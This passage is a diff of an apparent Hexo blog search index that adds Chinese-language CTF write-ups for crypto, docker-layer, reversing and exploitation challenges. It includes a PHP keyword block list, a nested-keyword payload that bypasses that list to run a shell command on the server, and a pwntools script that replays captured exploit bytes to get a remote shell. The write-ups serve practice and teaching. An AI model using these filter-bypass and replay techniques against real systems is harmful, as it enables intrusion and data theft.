+    $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd);
+
+    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
+    $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);
+
+    return $notetoadd;
+}
+
+if(isset($_POST[&quot;notewrite&quot;])) {
+    $newnote = $_POST[&quot;notewrite&quot;];
+
+    //3rd times the charm and I&apos;ve learned my lesson. Now I&apos;ll make sure to filter more than once :)
+    $notetoadd = filter($newnote);
+    $notetoadd = filter($notetoadd);
+    $notetoadd = filter($notetoadd);
+
+    $filename = generateRandomString();
+    array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);
+    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
+    header(&quot;location:index.php&quot;);
+}
+</code></pre>
+<p><strong>Payload</strong></p>
+<pre><code class="php+HTML">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php
+ echo `sort /fffflaglaglaglag.php`;
+????&gt;&gt;&gt;&gt;
+</code></pre>
+<p><strong>flag:</strong><code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -74,7 +485,109 @@
   <entry>
     <title>K3RN3LCTF2021 Writeup</title>
     <url>/posts/3427623925/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
+<p><em>Attachments</em></p>
+<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py" target="_blank" rel="noopener">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
+<hr>
+<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>
+<pre><code class="python">password = (<span class="string">"abda"</span>)    
+hash_obj = SHA256.new(password.encode(<span class="string">'utf-8'</span>))    
+hkey = hash_obj.digest()
+
+<span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(info)</span>:</span>
+    cipher = AES.new(hkey, AES.MODE_ECB)
+    result = cipher.decrypt(info)
+    <span class="keyword">return</span> result
+msg =  <span class="string">b'\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4}6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12'</span>
+
+print(decrypt(msg))
+</code></pre>
+<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>
+<pre><code class="python"><span class="string">b'https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file'</span>
+</code></pre>
+<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>
+<pre><code>A graphic or photographic representation 
+</code></pre><p>使用<a href="https://www.sonicvisualiser.org/download.html" target="_blank" rel="noopener">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>
+<p><img data-src="../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
+<p><strong>flag:</strong><code>flag{34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps}</code></p>
+<a id="more"></a>
+<h1 id="Progressive-Dynamite"><a href="#Progressive-Dynamite" class="headerlink" title="Progressive Dynamite"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>
+<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt" target="_blank" rel="noopener">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>
+<hr>
+<p>题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小.</p>
+<p>参照<a href="https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/" target="_blank" rel="noopener">Leetcode-最小路径和</a>,是一道典型的动态规划题,代码如下:</p>
+<pre><code class="python"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *
+<span class="keyword">from</span> challenge <span class="keyword">import</span> grid
+
+rows, columns = len(grid), len(grid[<span class="number">0</span>])
+dp = [[<span class="number">0</span>] * columns <span class="keyword">for</span> _ <span class="keyword">in</span> range(rows)]
+dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, rows):
+    dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>]
+<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, columns):
+    dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j - <span class="number">1</span>] + grid[<span class="number">0</span>][j]
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, rows):
+    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, columns):
+        dp[i][j] = min(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]) + grid[i][j]
+print(dp[rows - <span class="number">1</span>][columns - <span class="number">1</span>])
+print(long_to_bytes(dp[<span class="number">-1</span>][<span class="number">-1</span>]))
+</code></pre>
+<p><strong>flag:</strong><code>flag{dyn4m1c_pr0gramm1ng_pr0!}</code></p>
+<h1 id="Vieta’s-Poly"><a href="#Vieta’s-Poly" class="headerlink" title="Vieta’s Poly"></a>Vieta’s Poly</h1><p>Here’s a pwntools tutorial challenge to get you warmed up!</p>
+<p>nc ctf.k3rn3l4rmy.com 2236</p>
+<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py" target="_blank" rel="noopener">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>
+<hr>
+<p>题目给了一个多项式,要求我们计算:</p>
+<ul>
+<li>根的和</li>
+<li>根的倒数的和</li>
+<li>根的平方的和</li>
+</ul>
+<p>解析出多项式系数,借助<code>numpy.poly1d</code>构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数)</p>
+<p>代码:</p>
+<pre><code class="python"><span class="keyword">from</span> math <span class="keyword">import</span> ceil
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+context.log_level = <span class="string">'debug'</span>
+conn = remote(<span class="string">'ctf.k3rn3l4rmy.com'</span>, <span class="number">2236</span>)
+
+<span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span>
+    input = conn.recvline().strip().decode()
+    <span class="keyword">return</span> input
+
+<span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(polynomial)</span>:</span>
+    <span class="string">'''</span>
+<span class="string">    TODO: Parse polynomial</span>
+<span class="string">    For example, parse("x^3 + 2x^2 - x + 1") should return [1,2,-1,1]</span>
+<span class="string">    '''</span>
+    pattern = re.compile(<span class="string">r"([-]?\d+?)x\^\d+"</span>)
+    ls = pattern.findall(polynomial.replace(<span class="string">" "</span>,<span class="string">''</span>))
+    ls.insert(<span class="number">0</span>, <span class="number">1</span>)
+    <span class="keyword">return</span> list(map(int, ls))
+
+<span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):
+    get_input()
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):
+    type = get_input()
+    coeffs = parse(get_input())
+    ans = <span class="number">-1</span>
+    Q = np.poly1d(coeffs, r=<span class="literal">False</span>)
+    xs = np.roots(Q)
+    <span class="keyword">if</span> <span class="string">'sum of the roots'</span> <span class="keyword">in</span> type:
+        ans = xs.sum()
+    <span class="keyword">elif</span> <span class="string">'sum of the reciprocals of the roots'</span> <span class="keyword">in</span> type:
+        ans = (<span class="number">1</span>/xs).sum()
+    <span class="keyword">elif</span> <span class="string">'sum of the squares of the roots'</span> <span class="keyword">in</span> type:
+        ans = np.power(xs,<span class="number">2</span>).sum()
+    ans = ceil(round(ans.real,<span class="number">2</span>))
+    conn.sendline(str(ans))
+    get_input()
+conn.interactive()
+
+</code></pre>
+<p><strong>flag:</strong><code>flag{Viet4s_f0r_th3_win}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -86,7 +599,339 @@
   <entry>
     <title>BuckeyeCTF2021 Writeup</title>
     <url>/posts/4120451577/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="Key-Exchange"><a href="#Key-Exchange" class="headerlink" title="Key Exchange"></a>Key Exchange</h1><p><em>Let’s exchange the flag (securely):</em><br><em>nc crypto.chall.pwnoh.io 13374</em></p>
+<hr>
+<p>分析给出的代码,发现当输入的B等于g的时候,A的值即为<code>shared_secret</code>,从而可以得到AES密钥,解密后即可得到flag.</p>
+<p>使用nc连接服务器:</p>
+<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
+╰─$ nc crypto.chall.pwnoh.io 13374
+I&#39;m going to send you the flag.
+However, I noticed that an FBI agent has been eavesdropping on my messages,
+so I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag.
+
+p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351
+g = 5
+A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
+Give me your public key B: 5
+ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
+</code></pre>
+<p>代码</p>
+<pre><code class="python"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span>
+    shared_secret = <span class="number">6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180</span>
+    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:<span class="number">16</span>]
+    cipher = AES.new(key, AES.MODE_ECB)
+    message = <span class="number">0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8</span>
+    plaintext = cipher.decrypt(cun.long_to_bytes(message))
+    print(plaintext)
+
+decrypt()
+</code></pre>
+<p><strong>flag:</strong><code>buckeye{DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?}</code></p>
+<a id="more"></a>
+<h1 id="layers"><a href="#layers" class="headerlink" title="layers"></a>layers</h1><p><em>Check out my brand new docker repo <a href="https://hub.docker.com/r/qxxxb/layers" target="_blank" rel="noopener">https://hub.docker.com/r/qxxxb/layers</a></em></p>
+<hr>
+<p>查看镜像历史,发现曾经存在一个<code>flag.png</code>,但是被删除了</p>
+<pre><code class="shell">[root@VM-8-4-centos ~] docker history qxxxb/layers
+IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
+0c01a25ae5b7   5 days ago    /bin/sh -c echo "Sorry, the flag has been de…   36B
+&lt;missing&gt;      5 days ago    /bin/sh -c rm flag.png                          0B
+&lt;missing&gt;      5 days ago    /bin/sh -c #(nop) COPY multi:6b3bd56201fda03…   599kB
+&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop)  CMD ["/bin/sh"]              0B
+&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop) ADD file:aad4290d27580cc1a…   5.6MB
+</code></pre>
+<p>使用<code>docker save</code>将镜像保存成tar包并解压,然后再解压每一层文件夹中中的<code>layer.tar</code>找到<code>flag.png</code></p>
+<pre><code class="shell">[root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar
+[root@VM-8-4-centos ~]# tar xvf a.tar
+0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json
+7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/
+7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION
+7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json
+7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
+8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/
+8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION
+8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json
+8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar
+c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/
+c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION
+c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json
+c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar
+c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/
+c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION
+c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json
+c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar
+manifest.json
+repositories
+[root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
+Dockerfile
+flag.png
+</code></pre>
+<p><img data-src="../../CTF/BuckeyeCTF2021/Misc/images/flag.png" alt="flag"></p>
+<p><strong>flag:</strong><code>buckeye{D0CK3R_H4S_L4Y3RS}</code></p>
+<h1 id="replay"><a href="#replay" class="headerlink" title="replay"></a>replay</h1><p><em>Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on <code>misc.chall.pwnoh.io</code> on port <code>13371</code>. Can you pwn it for me?</em></p>
+<hr>
+<p>使用<a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener">Wireshark</a>分析<code>replay.pcap</code>文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令.</p>
+<p>对着“Data”右键,选择“导出分组字节流”,保存字节流数据至<code>a.bin</code></p>
+<p><img data-src="images/replay-1.png" alt="image-20211027235735902" style="zoom:60%;"></p>
+<p>编写脚本,使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwn</a>连接服务器并发送数据,执行shell命令,找到<code>flag.txt</code>文件</p>
+<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
+╰─$ python a.py
+[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
+[*] Switching to interactive mode
+<span class="meta">$</span><span class="bash"> ls</span>
+chall
+flag.txt
+<span class="meta">$</span><span class="bash"> cat flag.txt</span>
+buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
+</code></pre>
+<p>代码:</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p = remote(<span class="string">'misc.chall.pwnoh.io'</span>, <span class="number">13371</span>)
+p.recvuntil(<span class="string">b'TODAY'</span>, drop=<span class="literal">True</span>)
+p.recvline()
+<span class="keyword">with</span> open(<span class="string">'a.bin'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:
+    data  = f.read()
+p.send(data)
+p.interactive()
+p.close()
+</code></pre>
+<p><strong>flag:</strong><code>buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}</code></p>
+<h1 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h1><p><em>Anyone taken Software 1? Can you help me figure out what this weird Java program does?</em></p>
+<hr>
+<p>用<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener">javadecompilers</a>反编译<code>Buttons.jar</code>得到源码.</p>
+<p>观察到有一个<code>printFlag</code>函数,但是依赖于<code>moveHistory</code>,所以不能通过直接运行<code>printFlag</code>来得到flag.</p>
+<p>分析调用<code>printFlag</code>函数的<code>actionPerformed</code>,发现:只有当前点击的方格是<code>isLegalMove</code>的时候,才会被加到<code>moveHistory</code>里;当前点击的方格是最后一个时就会打印出<code>flag</code>.</p>
+<p>继续分析<code>isLegalMove</code>函数,发现该函数返回为<code>True</code>时必须满足<code>grid[n][n2] == 0</code>.</p>
+<p>那么我们可以在初始化的时候,将所有满足<code>grid[n][n2] == 0</code>的方格设为🏁,然后依次点击显示为🏁的方格即可.</p>
+<pre><code class="java"><span class="keyword">this</span>.buttons[i][j] = <span class="keyword">new</span> JButton(<span class="string">"?"</span>);
+
+<span class="keyword">if</span>(<span class="keyword">this</span>.grid[i][j] == <span class="number">0</span>){
+  <span class="keyword">this</span>.buttons[i][j].setText(<span class="string">"\u2691"</span>);
+}
+</code></pre>
+<p>使用<code>javac</code>命令将源代码编译为Java字节码文件并运行.</p>
+<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
+╰─$ javac Buttons.java
+注: Buttons.java使用了未经检查或不安全的操作。
+注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。
+╭─ ~/CTF/BuckeyeCTF2021
+╰─$ java Buttons
+</code></pre>
+<p><img data-src="../../CTF/BuckeyeCTF2021/Reverse/images/Buttons.png" alt="Buttons!"></p>
+<p>代码</p>
+<pre><code class="java"><span class="comment">/*</span>
+<span class="comment"> * Decompiled with CFR 0.150.</span>
+<span class="comment"> */</span>
+<span class="keyword">import</span> java.awt.Dimension;
+<span class="keyword">import</span> java.awt.GridLayout;
+<span class="keyword">import</span> java.awt.event.ActionEvent;
+<span class="keyword">import</span> java.awt.event.ActionListener;
+<span class="keyword">import</span> java.math.BigInteger;
+<span class="keyword">import</span> java.nio.charset.StandardCharsets;
+<span class="keyword">import</span> java.util.ArrayList;
+<span class="keyword">import</span> javax.swing.BoxLayout;
+<span class="keyword">import</span> javax.swing.JButton;
+<span class="keyword">import</span> javax.swing.JFrame;
+<span class="keyword">import</span> javax.swing.JLabel;
+<span class="keyword">import</span> javax.swing.JOptionPane;
+<span class="keyword">import</span> javax.swing.JPanel;
+
+<span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Buttons</span></span>
+<span class="class"><span class="keyword">extends</span> <span class="title">JFrame</span></span>
+<span class="class"><span class="keyword">implements</span> <span class="title">ActionListener</span> </span>{
+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span>[][] grid = <span class="keyword">new</span> <span class="keyword">int</span>[][]{
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>}, 
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>},
+        {<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>},
